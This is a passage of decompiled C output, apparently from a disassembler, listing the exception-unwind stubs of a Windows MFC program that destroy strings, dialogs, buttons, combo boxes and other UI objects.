  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x2ec));
  return;
}

void Unwind_0041363b(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x2f0));
  return;
}

void Unwind_00413646(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x2e0));
  return;
}

void Unwind_00413651(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x2e4));
  return;
}

void Unwind_00413670(void)

{
  int unaff_EBP;
  
  FUN_00401f30((undefined4 *)(unaff_EBP + -0x4e4));
  return;
}

void Unwind_00413690(void)

{
  int unaff_EBP;
  
  FUN_00401f30((undefined4 *)(unaff_EBP + -0x4e4));
  return;
}

void Unwind_004136b0(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_004136d0(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_004136f0(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00413710(void)

{
  int unaff_EBP;
  
  _CStatic(*(CStatic **)(unaff_EBP + -0x10));
  return;
}

void Unwind_00413718(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x40));
  return;
}

void Unwind_00413723(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x44));
  return;
}

void Unwind_0041372e(void)

{
  int unaff_EBP;
  
  FUN_00404000((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x48));
  return;
}

void Unwind_00413750(void)

{
  int unaff_EBP;
  
  _CStatic(*(CStatic **)(unaff_EBP + -0x14));
  return;
}

void Unwind_00413758(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x14) + 0x40));
  return;
}

void Unwind_00413763(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x14) + 0x44));
  return;
}

void Unwind_0041376e(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00413780(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + 4));
  return;
}

void Unwind_004137a0(void)

{
  int unaff_EBP;
  
  _CPaintDC((CPaintDC *)(unaff_EBP + -0x60));
  return;
}

void Unwind_004137c0(void)

{
  int unaff_EBP;
  
  _CClientDC((CClientDC *)(unaff_EBP + -0x20));
  return;
}

void Unwind_004137e0(void)

{
  int unaff_EBP;
  
  _CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}

void Unwind_004137e8(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}

void Unwind_004137f3(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 100));
  return;
}

void Unwind_004137fe(void)

{
  int unaff_EBP;
  
  FUN_00404000((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x70));
  return;
}

void Unwind_00413820(void)

{
  int unaff_EBP;
  
  _CDialog(*(CDialog **)(unaff_EBP + -0x14));
  return;
}

void Unwind_00413828(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x14) + 0x60));
  return;
}

void Unwind_00413833(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 100));
  return;
}

void Unwind_0041383e(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00413846(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00413860(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x24));
  return;
}

void Unwind_00413868(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x24) = 0x415bec;
  return;
}

void Unwind_00413880(void)

{
  int unaff_EBP;
  
  _CStatic(*(CStatic **)(unaff_EBP + -0x10));
  return;
}

void Unwind_00413888(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x44));
  return;
}

void Unwind_004138a0(void)

{
  int unaff_EBP;
  
  _CStatic(*(CStatic **)(unaff_EBP + -0x10));
  return;
}

void Unwind_004138c0(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x18));
  return;
}

void Unwind_004138c8(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x1c));
  return;
}

void Unwind_004138d0(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x24));
  return;
}

void Unwind_004138d8(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x1c));
  return;
}

void Unwind_004138e0(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x18));
  return;
}

void Unwind_004138e8(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x24));
  return;
}

void Unwind_004138f0(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x1c));
  return;
}

void Unwind_004138f8(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x18));
  return;
}

void Unwind_00413900(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x20));
  return;
}

void Unwind_00413908(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x10));
  return;
}

void Unwind_00413910(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x14));
  return;
}

void Unwind_00413930(void)

{
  int unaff_EBP;
  
  _CPaintDC((CPaintDC *)(unaff_EBP + -0x60));
  return;
}

void Unwind_00413938(void)

{
  int unaff_EBP;
  
  _CDC((CDC *)(unaff_EBP + -0xc0));
  return;
}

void Unwind_00413950(void)

{
  int unaff_EBP;
  
  FUN_00405e10((CDialog *)(unaff_EBP + -0x8a4));
  return;
}

void Unwind_0041395b(void)

{
  int unaff_EBP;
  
  _CDialog((CDialog *)(unaff_EBP + -0x8a4));
  return;
}

void Unwind_00413966(void)

{
  int unaff_EBP;
  
  _CComboBox((CComboBox *)(unaff_EBP + -0x844));
  return;
}

void Unwind_00413971(void)

{
  int unaff_EBP;
  
  _CButton((CButton *)(unaff_EBP + -0x804));
  return;
}

void Unwind_0041397c(void)

{
  int unaff_EBP;
  
  _CButton((CButton *)(unaff_EBP + -0x7c4));
  return;
}

void Unwind_00413987(void)

{
  int unaff_EBP;
  
  FUN_00405d90((undefined4 *)(unaff_EBP + -0x784));
  return;
}

void Unwind_00413992(void)

{
  int unaff_EBP;
  
  FUN_00405d90((undefined4 *)(unaff_EBP + -0x700));
  return;
}

void Unwind_0041399d(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(unaff_EBP + -0x67c));
  return;
}

void Unwind_004139a8(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(unaff_EBP + -0x614));
  return;
}

void Unwind_004139b3(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(unaff_EBP + -0x5ac));
  return;
}

void Unwind_004139be(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(unaff_EBP + -0x544));
  return;
}

void Unwind_004139c9(void)

{
  int unaff_EBP;
  
  FUN_004050a0((undefined4 *)(unaff_EBP + -0x4dc));
  return;
}

void Unwind_004139d4(void)

{
  int unaff_EBP;
  
  FUN_004050a0((undefined4 *)(unaff_EBP + -0x460));
  return;
}

void Unwind_004139df(void)

{
  int unaff_EBP;
  
  _CRichEditCtrl((CRichEditCtrl *)(unaff_EBP + -0x3e4));
  return;
}

void Unwind_004139ea(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x3a4));
  return;
}

void Unwind_004139f5(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x3a0));
  return;
}

void Unwind_00413a00(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x39c));
  return;
}

void Unwind_00413a0b(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x88));
  return;
}

void Unwind_00413a16(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x74));
  return;
}

void Unwind_00413a1e(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x6c));
  return;
}

void Unwind_00413a26(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -100));
  return;
}

void Unwind_00413a2e(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x5c));
  return;
}

void Unwind_00413a36(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x54));
  return;
}

void Unwind_00413a3e(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x4c));
  return;
}

void Unwind_00413a46(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x44));
  return;
}

void Unwind_00413a4e(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x3c));
  return;
}

void Unwind_00413a56(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x34));
  return;
}

void Unwind_00413a5e(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x2c));
  return;
}

void Unwind_00413a66(void)

{
  int unaff_EBP;
  
  FUN_00404000((undefined4 *)(unaff_EBP + -0x24));
  return;
}

void Unwind_00413a6e(void)

{
  int unaff_EBP;
  
  FUN_00404000((undefined4 *)(unaff_EBP + -0x1c));
  return;
}

void Unwind_00413a80(void)

{
  int unaff_EBP;
  
  _CProgressCtrl(*(CProgressCtrl **)(unaff_EBP + -0x10));
  return;
}

void Unwind_00413aa0(void)

{
  int unaff_EBP;
  
  _CDialog(*(CDialog **)(unaff_EBP + -0x14));
  return;
}

void Unwind_00413aa8(void)

{
  int unaff_EBP;
  
  _CComboBox((CComboBox *)(*(int *)(unaff_EBP + -0x14) + 0x60));
  return;
}

void Unwind_00413ab3(void)

{
  int unaff_EBP;
  
  _CButton((CButton *)(*(int *)(unaff_EBP + -0x14) + 0xa0));
  return;
}

void Unwind_00413ac1(void)

{
  int unaff_EBP;
  
  _CButton((CButton *)(*(int *)(unaff_EBP + -0x14) + 0xe0));
  return;
}

void Unwind_00413acf(void)

{
  int unaff_EBP;
  
  FUN_00405d90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x120));
  return;
}

void Unwind_00413add(void)

{
  int unaff_EBP;
  
  FUN_00405d90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x1a4));
  return;
}

void Unwind_00413aeb(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x228));
  return;
}

void Unwind_00413af9(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x290));
  return;
}

void Unwind_00413b07(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x2f8));
  return;
}

void Unwind_00413b15(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x360));
  return;
}

void Unwind_00413b23(void)

{
  int unaff_EBP;
  
  FUN_004050a0((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x3c8));
  return;
}

void Unwind_00413b31(void)

{
  int unaff_EBP;
  
  FUN_004050a0((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x444));
  return;
}

void Unwind_00413b3f(void)

{
  int unaff_EBP;
  
  _CRichEditCtrl((CRichEditCtrl *)(*(int *)(unaff_EBP + -0x14) + 0x4c0));
  return;
}

void Unwind_00413b4d(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x14) + 0x500));
  return;
}

void Unwind_00413b5b(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x14) + 0x504));
  return;
}

void Unwind_00413b69(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x14) + 0x508));
  return;
}

void Unwind_00413b77(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x14) + 0x81c));
  return;
}

void Unwind_00413b85(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x830));
  return;
}

void Unwind_00413b93(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x838));
  return;
}

void Unwind_00413ba1(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x840));
  return;
}

void Unwind_00413baf(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x848));
  return;
}

void Unwind_00413bbd(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x850));
  return;
}

void Unwind_00413bcb(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x858));
  return;
}

void Unwind_00413bd9(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x860));
  return;
}

void Unwind_00413be7(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x868));
  return;
}

void Unwind_00413bf5(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x870));
  return;
}

void Unwind_00413c03(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x878));
  return;
}

void Unwind_00413c11(void)

{
  int unaff_EBP;
  
  FUN_00404000((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x880));
  return;
}

void Unwind_00413c1f(void)

{
  int unaff_EBP;
  
  FUN_00404000((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x888));
  return;
}

void Unwind_00413c2d(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00413c35(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00413c3d(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00413c45(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00413c4d(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00413c55(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00413c5d(void)

{
  int unaff_EBP;
  
  _CProgressCtrl(*(CProgressCtrl **)(unaff_EBP + -0x10));
  return;
}

void Unwind_00413c70(void)

{
  int unaff_EBP;
  
  _CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}

void Unwind_00413c78(void)

{
  int unaff_EBP;
  
  _CComboBox((CComboBox *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}

void Unwind_00413c83(void)

{
  int unaff_EBP;
  
  _CButton((CButton *)(*(int *)(unaff_EBP + -0x10) + 0xa0));
  return;
}

void Unwind_00413c91(void)

{
  int unaff_EBP;
  
  _CButton((CButton *)(*(int *)(unaff_EBP + -0x10) + 0xe0));
  return;
}

void Unwind_00413c9f(void)

{
  int unaff_EBP;
  
  FUN_00405d90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x120));
  return;
}

void Unwind_00413cad(void)

{
  int unaff_EBP;
  
  FUN_00405d90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x1a4));
  return;
}

void Unwind_00413cbb(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x228));
  return;
}

void Unwind_00413cc9(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x290));
  return;
}

void Unwind_00413cd7(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x2f8));
  return;
}

void Unwind_00413ce5(void)

{
  int unaff_EBP;
  
  FUN_00404170((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x360));
  return;
}

void Unwind_00413cf3(void)

{
  int unaff_EBP;
  
  FUN_004050a0((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x3c8));
  return;
}

void Unwind_00413d01(void)

{
  int unaff_EBP;
  
  FUN_004050a0((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x444));
  return;
}

void Unwind_00413d0f(void)

{
  int unaff_EBP;
  
  _CRichEditCtrl((CRichEditCtrl *)(*(int *)(unaff_EBP + -0x10) + 0x4c0));
  return;
}

void Unwind_00413d1d(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x500));
  return;
}

void Unwind_00413d2b(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x504));
  return;
}

void Unwind_00413d39(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x508));
  return;
}

void Unwind_00413d47(void)

{
  int unaff_EBP;
  
  _CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x81c));
  return;
}

void Unwind_00413d55(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x830));
  return;
}

void Unwind_00413d63(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x838));
  return;
}

void Unwind_00413d71(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x840));
  return;
}

void Unwind_00413d7f(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x848));
  return;
}

void Unwind_00413d8d(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x850));
  return;
}

void Unwind_00413d9b(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x858));
  return;
}

void Unwind_00413da9(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x860));
  return;
}

void Unwind_00413db7(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x868));
  return;
}

void Unwind_00413dc5(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x870));
  return;
}

void Unwind_00413dd3(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x878));
  return;
}

void Unwind_00413de1(void)

{
  int unaff_EBP;
  
  FUN_00404000((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x880));
  return;
}

void Unwind_00413def(void)

{
  int unaff_EBP;
  
  FUN_00404000((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x888));
  return;
}

void Unwind_00413dfd(void)

{
  int unaff_EBP;
  
  FUN_00404000((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x890));
  return;
}

void Unwind_00413e20(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x24));
  return;
}

void Unwind_00413e28(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x24) = 0x415bec;
  return;
}

void Unwind_00413e40(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x11c));
  return;
}

void Unwind_00413e4b(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x114));
  return;
}

void Unwind_00413e56(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x118));
  return;
}

void Unwind_00413e70(void)

{
  int unaff_EBP;
  
  _CFile((CFile *)(unaff_EBP + -0x1c));
  return;
}

void Unwind_00413e90(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0xe0));
  return;
}

void Unwind_00413eb0(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x98));
  return;
}

void Unwind_00413ed0(void)

{
  int unaff_EBP;
  
  FUN_00404cf0((CDialog *)(unaff_EBP + -0x84));
  return;
}

void Unwind_00413edb(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x8c));
  return;
}

void Unwind_00413ee6(void)

{
  int unaff_EBP;
  
  _CDialog((CDialog *)(unaff_EBP + -0x84));
  return;
}

void Unwind_00413ef1(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x24));
  return;
}

void Unwind_00413ef9(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x20));
  return;
}

void Unwind_00413f01(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x88) = 0x415bec;
  return;
}

void Unwind_00413f0c(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x88) = 0x415bec;
  return;
}

void Unwind_00413f30(void)

{
  int unaff_EBP;
  
  FUN_004031a0((CDialog *)(unaff_EBP + -0x104));
  return;
}

void Unwind_00413f3b(void)

{
  int unaff_EBP;
  
  _CDialog((CDialog *)(unaff_EBP + -0x104));
  return;
}

void Unwind_00413f46(void)

{
  int unaff_EBP;
  
  _CListCtrl((CListCtrl *)(unaff_EBP + -0xa4));
  return;
}

void Unwind_00413f51(void)

{
  int unaff_EBP;
  
  _CComboBox((CComboBox *)(unaff_EBP + -100));
  return;
}

void Unwind_00413f59(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x24));
  return;
}

void Unwind_00413f61(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x108) = 0x415bec;
  return;
}

void Unwind_00413f6c(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x108) = 0x415bec;
  return;
}

void Unwind_00413f90(void)

{
  int unaff_EBP;
  
  FUN_004010c0((CDialog *)(unaff_EBP + -0xc4));
  return;
}

void Unwind_00413f9b(void)

{
  int unaff_EBP;
  
  _CDialog((CDialog *)(unaff_EBP + -0xc4));
  return;
}

void Unwind_00413fb0(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + 4));
  return;
}

void Unwind_00413fb8(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x98));
  return;
}

void Unwind_00413fc3(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0x98));
  return;
}

void Unwind_00413fe0(void)

{
  int unaff_EBP;
  
  _CProgressCtrl(*(CProgressCtrl **)(unaff_EBP + -0x10));
  return;
}

void Unwind_00413fe8(void)

{
  int unaff_EBP;
  
  _CDWordArray((CDWordArray *)(*(int *)(unaff_EBP + -0x10) + 0x40));
  return;
}

void Unwind_00414000(void)

{
  int unaff_EBP;
  
  _CPaintDC((CPaintDC *)(unaff_EBP + -0x78));
  return;
}

void Unwind_00414008(void)

{
  int unaff_EBP;
  
  _CDC((CDC *)(unaff_EBP + -0xf4));
  return;
}

void Unwind_00414013(void)

{
  int unaff_EBP;
  
  FUN_00409e20((undefined4 *)(unaff_EBP + -0xe4));
  return;
}

void Unwind_0041401e(void)

{
  int unaff_EBP;
  
  FUN_00408b40((undefined4 *)(unaff_EBP + -0xf4));
  return;
}

void Unwind_00414029(void)

{
  int unaff_EBP;
  
  _CDC((CDC *)(unaff_EBP + -0xf4));
  return;
}

void Unwind_00414034(void)

{
  int unaff_EBP;
  
  FUN_00409e20((undefined4 *)(unaff_EBP + -0xe4));
  return;
}

void Unwind_0041403f(void)

{
  int unaff_EBP;
  
  _CDC((CDC *)(unaff_EBP + -0xf4));
  return;
}

void Unwind_0041404a(void)

{
  int unaff_EBP;
  
  FUN_00409e20((undefined4 *)(unaff_EBP + -0xe4));
  return;
}

void Unwind_00414060(void)

{
  int unaff_EBP;
  
  _CDC(*(CDC **)(unaff_EBP + -0x14));
  return;
}

void Unwind_00414068(void)

{
  int unaff_EBP;
  
  FUN_00409e20((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0x10));
  return;
}

void Unwind_00414073(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00414090(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x44));
  return;
}

void Unwind_00414098(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x44) = 0x415bec;
  return;
}

void Unwind_004140b0(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0xcc));
  return;
}

void Unwind_004140bb(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x90) = 0x416794;
  return;
}

void Unwind_004140c6(void)

{
  int unaff_EBP;
  
  FUN_00409790((undefined4 *)(unaff_EBP + -0x88));
  return;
}

void Unwind_004140d1(void)

{
  int unaff_EBP;
  
  FUN_004097e0((undefined4 *)(unaff_EBP + -0x90));
  return;
}

void Unwind_004140dc(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x7c) = 0x416794;
  return;
}

void Unwind_004140e4(void)

{
  int unaff_EBP;
  
  FUN_00409940((undefined4 *)(unaff_EBP + -0x7c));
  return;
}

void Unwind_004140ec(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x5c) = 0x416794;
  return;
}

void Unwind_004140f4(void)

{
  int unaff_EBP;
  
  FUN_004098c0((undefined4 *)(unaff_EBP + -0x5c));
  return;
}

void Unwind_004140fc(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x68) = 0x416794;
  return;
}

void Unwind_00414104(void)

{
  int unaff_EBP;
  
  FUN_004099c0((undefined4 *)(unaff_EBP + -0x68));
  return;
}

void Unwind_0041410c(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -200));
  return;
}

void Unwind_00414117(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x68) = 0x416794;
  return;
}

void Unwind_0041411f(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x5c) = 0x416794;
  return;
}

void Unwind_00414127(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x7c) = 0x416794;
  return;
}

void Unwind_0041412f(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x90) = 0x416794;
  return;
}

void Unwind_0041413a(void)

{
  int unaff_EBP;
  
  FUN_00409790((undefined4 *)(unaff_EBP + -0x88));
  return;
}

void Unwind_00414145(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x70) = 0x415bec;
  return;
}

void Unwind_00414160(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00414180(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x14) = 0x416794;
  return;
}

void Unwind_00414188(void)

{
  int unaff_EBP;
  
  FUN_00409790((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 8));
  return;
}

void Unwind_00414193(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_004141b0(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x416794;
  return;
}

void Unwind_004141d0(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x416794;
  return;
}

void Unwind_004141f0(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x416794;
  return;
}

void Unwind_00414210(void)

{
  int unaff_EBP;
  
  FUN_00409ec0((undefined4 *)(unaff_EBP + -0x24));
  return;
}

void Unwind_00414218(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x24) = 0x415bec;
  return;
}

void Unwind_00414230(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00414250(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00414270(void)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  int unaff_EBP;
  
  ppiVar1 = *(int ***)(unaff_EBP + -0x480);
  ppiVar3 = (int **)*ppiVar1;
  while (ppiVar3 != ppiVar1) {
    ppiVar2 = (int **)*ppiVar3;
    *(int **)ppiVar3[1] = *ppiVar3;
    *(int **)(*ppiVar3 + 1) = ppiVar3[1];
